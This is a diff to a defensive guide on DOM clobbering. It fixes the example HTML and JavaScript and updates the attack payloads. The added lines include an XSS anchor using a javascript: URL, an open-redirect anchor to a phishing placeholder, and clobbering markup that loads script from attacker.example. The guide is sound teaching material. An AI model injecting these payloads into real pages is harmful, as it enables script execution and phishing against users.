@@ -17,10 +17,10 @@ When a webpage is loaded, the browser creates a [DOM tree](https://developer.moz
 When creating the DOM tree, browsers also create an attribute for (some) named HTML elements on `window` and `document` objects. Named HTML elements are those having an `id` or `name` attribute. For example, the markup:
 
 ```html
-<form id=x></a>
+<form id=x name=x></form>
 ```
 
-will lead to browsers creating references to that form element with the attribute `x` of `window` and `document`:
+creates named references to the form on `window` and `document`. The `name` attribute is needed for [named access on `document`](https://html.spec.whatwg.org/multipage/dom.html#dom-document-nameditem); a form's `id` alone does not provide that reference:
 
 ```js
 var obj1 = document.getElementById('x');
@@ -48,19 +48,19 @@ location.assign(redirectTo);
 
 The attacker can:
 
-- inject the markup `<a id=redirectTo href='javascript:alert(1)'` and obtain XSS.
-- inject the markup `<a id=redirectTo href='phishing.com'` and obtain open redirect.
+- inject the markup `<a id=redirectTo href='javascript:alert(1)'></a>` and obtain XSS.
+- inject the markup `<a id=redirectTo href='https://phishing.example/'></a>` and obtain open redirect.
 
 ### Example Attack 2
 
 ```javascript
 var script = document.createElement('script');
 let src = window.config.url || 'script.js';
-s.src = src;
-document.body.appendChild(s);
+script.src = src;
+document.body.appendChild(script);
 ```
 
-The attacker can inject the markup `<a id=config><a id=config name=url href='malicious.js'>` to load additional JavaScript code, and obtain arbitrary client-side code execution.
+The attacker can inject the markup `<a id=config></a><a id=config name=url href='https://attacker.example/payload.js'></a>` to load additional JavaScript code, and obtain arbitrary client-side code execution.
 
 ## Summary of Guidelines
 
